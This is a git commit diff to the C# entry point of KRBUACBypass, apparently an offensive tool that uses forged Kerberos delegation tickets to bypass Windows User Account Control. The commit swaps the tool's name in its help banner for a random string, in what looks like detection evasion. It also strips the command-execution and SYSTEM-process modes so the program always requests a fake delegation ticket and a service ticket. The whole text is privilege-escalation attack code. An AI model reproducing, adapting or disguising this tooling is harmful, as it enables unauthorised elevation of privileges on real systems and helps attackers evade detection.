043fb3c1e44b08c9d63171e13bd3e83010678893
Víctor García <56491288+takito1812@users.noreply.github.com>
2024-03-22 09:54:40 +0100

    Update Program.cs

--- KRBUACBypass/Program.cs
+++ KRBUACBypass/Program.cs
@@ -18,7 +18,7 @@ namespace KRBUACBypass
 
     internal class Program
     {
-        public static bool wrapTickets = true;
+        public static bool wrapTickets = false;
         public static bool Debug = false;
         public static bool Verbose = false;
         public static bool BogusMachineID = true;
@@ -41,8 +41,8 @@ namespace KRBUACBypass
             {
                 h.AdditionalNewLineAfterOption = false;
                 h.MaximumDisplayWidth = 100;
-                h.Heading = "\nKRBUACBypass 1.0.0-beta"; //change header
-                h.Copyright = "Copyright (c) 2023"; //change copyright text
+                h.Heading = "\ntstaklbgl2m 1.0.0-beta"; //change header
+                h.Copyright = "Copyright (c) 2024"; //change copyright text
                 return HelpText.DefaultParsingErrorsHandler(result, h);
             }, e => e);
             Console.WriteLine(helpText);
@@ -60,46 +60,9 @@ namespace KRBUACBypass
             string outfile = "";
             bool ptt = true;
 
-            if(method == "asktgs")
-            {
-                byte[] blah = LSA.RequestFakeDelegTicket();
-                KRB_CRED kirbi = new KRB_CRED(blah);
-                Ask.TGS(kirbi, service, requestEType, outfile, ptt, domainController);
-            }
-
-            if (method == "krbscm")
-            {
-                // extract out the tickets (w/ full data) with the specified targeting options
-                List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(false, new LUID(), "HOST", null, null, true);
-                
-                if(sessionCreds[0].Tickets.Count > 0)
-                {
-                    // display tickets with the "Full" format
-                    LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Klist);
-                    try
-                    {
-                        KrbSCM.Execute(command);
-                    }
-                    catch { }
-                    return;
-                }
-                else
-                {
-                    Console.WriteLine("[-] Please request a HOST service ticket for the current user first.");
-                    Console.WriteLine("[-] Please execute: KRBUACBypass.exe asktgs.");
-                    return;
-                }
-            }
-
-            if (method == "system")
-            {
-                try
-                {
-                    KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
-                }
-                catch { }
-                return;
-            }
+            byte[] blah = LSA.RequestFakeDelegTicket();
+            KRB_CRED kirbi = new KRB_CRED(blah);
+            Ask.TGS(kirbi, service, requestEType, outfile, ptt, domainController);
         }
     }
 }
